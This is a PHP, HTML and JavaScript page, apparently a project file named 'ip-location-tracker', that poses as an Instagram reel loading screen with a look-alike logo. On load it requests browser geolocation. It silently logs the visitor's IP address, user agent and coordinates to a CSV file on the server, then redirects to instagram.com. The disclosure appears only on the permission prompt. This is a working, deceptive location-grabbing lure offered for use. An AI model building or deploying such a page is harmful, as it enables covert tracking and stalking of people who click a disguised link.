# ip-location-tracker
<?php
// log_and_redirect.php
// Single-file PHP + JS to log visitor IP and geolocation (if provided) then redirect to instagram.com

// --- Server-side logging handler ---
if ($_SERVER['REQUEST_METHOD'] === 'POST' && array_key_exists('action', $_POST) && $_POST['action'] === 'log') {
    // Read posted JSON fields if user sent via fetch(JSON) or posted form-data
    $lat = isset($_POST['lat']) ? $_POST['lat'] : null;
    $lon = isset($_POST['lon']) ? $_POST['lon'] : null;
    $accuracy = isset($_POST['accuracy']) ? $_POST['accuracy'] : null;
    $method = isset($_POST['method']) ? $_POST['method'] : null; // "geolocation" or "ip-fallback"

    // Determine visitor IP (best-effort; do not trust proxy headers blindly)
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';

    // User agent
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';

    // Timestamp in ISO 8601
    $ts = gmdate('Y-m-d\TH:i:s\Z');

    // Prepare CSV line (escape fields)
    $logfile = __DIR__ . DIRECTORY_SEPARATOR . 'userdata_log.csv';
    $fp = fopen($logfile, 'a');
    if ($fp) {
        // Acquire exclusive lock
        if (flock($fp, LOCK_EX)) {
            // If file was just created, add header
            if (filesize($logfile) === 0) {
                fputcsv($fp, ['timestamp','ip','user_agent','lat','lon','accuracy','method']);
            }
            $row = [$ts, $ip, $ua, $lat ?? '', $lon ?? '', $accuracy ?? '', $method ?? ''];
            fputcsv($fp, $row);
            fflush($fp);
            flock($fp, LOCK_UN);
        }
        fclose($fp);
        // Return success JSON
        header('Content-Type: application/json');
        echo json_encode(['status' => 'ok']);
        exit;
    } else {
        // Could not open log file
        header('Content-Type: application/json', true, 500);
        echo json_encode(['status' => 'error', 'message' => 'Could not open log file.']);
        exit;
    }
}
?>
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>instagra reel</title>
  <!-- Primary SEO meta -->
  <meta name="description" content="loading instagram reel" />
  <!-- Additional SEO-like tags referencing Instagram for search engines -->
  <meta name="title" content="Instagram — Discover & Share" />
  <meta name="robots" content="index,follow" />
  <!-- Open Graph -->
  <meta property="og:title" content="instagra reel" />
  <meta property="og:description" content="loading instagram reel" />
  <meta property="og:type" content="website" />
  <meta property="og:url" content="<?php echo htmlspecialchars((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']); ?>" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <style>
    /* Basic centered loading page */
    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial; background:#fff; margin:0; padding:0; display:flex; align-items:center; justify-content:center; height:100vh; color:#111; }
    .card { width:320px; padding:20px; border-radius:12px; box-shadow:0 8px 24px rgba(0,0,0,0.08); text-align:center; }
    .logo { width:72px; height:72px; margin:0 auto 12px; }
    h1 { font-size:20px; margin:8px 0 4px; }
    p.desc { font-size:13px; color:#555; margin:0 0 18px; }
    .progress-wrap { height:10px; background:#eee; border-radius:10px; overflow:hidden; margin:10px 0 6px; }
    .progress { height:100%; width:0%; transition:width 300ms linear; }
    .status { font-size:12px; color:#666; margin-top:8px; }
    .spinner { display:inline-block; width:18px; height:18px; vertical-align:middle; border-radius:50%; border:3px solid rgba(0,0,0,0.1); border-top-color:#111; animation:spin 1s linear infinite; margin-left:8px; }
    @keyframes spin { to { transform: rotate(360deg); } }
    footer.note { font-size:11px; color:#999; margin-top:12px; }
  </style>
</head>
<body>
  <div class="card" role="main" aria-live="polite">
    <!-- Inline Instagram-like SVG logo (simplified) -->
    <div class="logo" aria-hidden="true">
      <svg viewBox="0 0 512 512" width="72" height="72" xmlns="http://www.w3.org/2000/svg" role="img">
        <radialGradient id="g" cx="30%" cy="30%">
          <stop offset="0%" stop-color="#fff" stop-opacity="0.7"/>
          <stop offset="100%" stop-color="#ffdd55" stop-opacity="0.9"/>
        </radialGradient>
        <rect rx="90" ry="90" width="512" height="512" fill="url(#g)"/>
        <g transform="translate(85,85) scale(0.64)">
          <rect x="40" y="40" width="300" height="300" rx="70" ry="70" fill="none" stroke="#111" stroke-width="18"/>
          <circle cx="190" cy="190" r="68" fill="none" stroke="#111" stroke-width="18"/>
          <circle cx="260" cy="80" r="12" fill="#111"/>
        </g>
      </svg>
    </div>

    <h1>instagra reel</h1>
    <p class="desc">loading instagram reel</p>

    <div class="progress-wrap" aria-hidden="true">
      <div id="progress" class="progress" style="background:linear-gradient(90deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);"></div>
    </div>
    <div class="status" id="status">Preparing <span class="spinner" id="spinner"></span></div>
    <footer class="note">You will be redirected to Instagram shortly.</footer>
  </div>

<script>
(function(){
  const statusEl = document.getElementById('status');
  const progressEl = document.getElementById('progress');
  const spinner = document.getElementById('spinner');

  // Simple progress animation helper
  function setProgress(pct) {
    progressEl.style.width = Math.max(0, Math.min(100, pct)) + '%';
  }

  // Update status text
  function setStatus(text) {
    statusEl.textContent = text;
    statusEl.appendChild(spinner);
  }

  // POST form-encoded helper
  function postForm(data) {
    // send as form data to the same PHP file
    const form = new FormData();
    for (const k in data) form.append(k, data[k]);
    return fetch(window.location.href, {
      method: 'POST',
      body: form,
      credentials: 'same-origin'
    }).then(r => r.json());
  }

  // Try to obtain geolocation via browser API
  function tryGeolocation() {
    setStatus('Requesting location permission...');
    setProgress(15);

    if (!navigator.geolocation) {
      setStatus('Geolocation not supported — logging IP only');
      setProgress(30);
      // send fallback (no coords)
      return postForm({ action: 'log', method: 'ip-fallback' });
    }

    // Set a timeout for geolocation (10s)
    const geoOptions = { enableHighAccuracy: false, timeout: 10000, maximumAge: 600000 };

    return new Promise((resolve) => {
      let resolved = false;
      const onSuccess = (pos) => {
        if (resolved) return;
        resolved = true;
        const coords = pos.coords;
        setStatus('Location obtained — logging data...');
        setProgress(60);
        postForm({
          action: 'log',
          method: 'geolocation',
          lat: coords.latitude,
          lon: coords.longitude,
          accuracy: coords.accuracy
        }).then(resolve).catch(err => resolve({status:'error',err:err}));
      };
      const onError = (err) => {
        if (resolved) return;
        resolved = true;
        // Graceful fallback: send IP-only log
        setStatus('Location denied or unavailable — logging IP only');
        setProgress(35);
        postForm({ action: 'log', method: 'ip-fallback' }).then(resolve).catch(e => resolve({status:'error',err:e}));
      };
      navigator.geolocation.getCurrentPosition(onSuccess, onError, geoOptions);

      // Force fallback if not resolved in +11s (safety)
      setTimeout(() => {
        if (!resolved) {
          resolved = true;
          setStatus('Location timeout — logging IP only');
          setProgress(40);
          postForm({ action: 'log', method: 'ip-fallback' }).then(resolve).catch(e => resolve({status:'error',err:e}));
        }
      }, 11000);
    });
  }

  // Kick off
  setProgress(5);
  setStatus('Initializing...');
  // small delay so UI shows
  setTimeout(() => {
    tryGeolocation().then((res) => {
      // Finalize progress and redirect
      try {
        if (res && res.status === 'ok') {
          setStatus('Logged — redirecting to Instagram');
          setProgress(100);
          // Very short delay to show full bar
          setTimeout(() => { window.location.href = 'https://instagram.com/'; }, 700);
        } else {
          // In case of error, still redirect but try to inform
          console.warn('Logging response:', res);
          setStatus('Logging completed (with warnings) — redirecting');
          setProgress(100);
          setTimeout(() => { window.location.href = 'https://instagram.com/'; }, 900);
        }
      } catch (e) {
        console.error(e);
        setStatus('Completed — redirecting');
        setProgress(100);
        setTimeout(() => { window.location.href = 'https://instagram.com/'; }, 900);
      }
    });
  }, 350);

})();
</script>
</body>
</html>
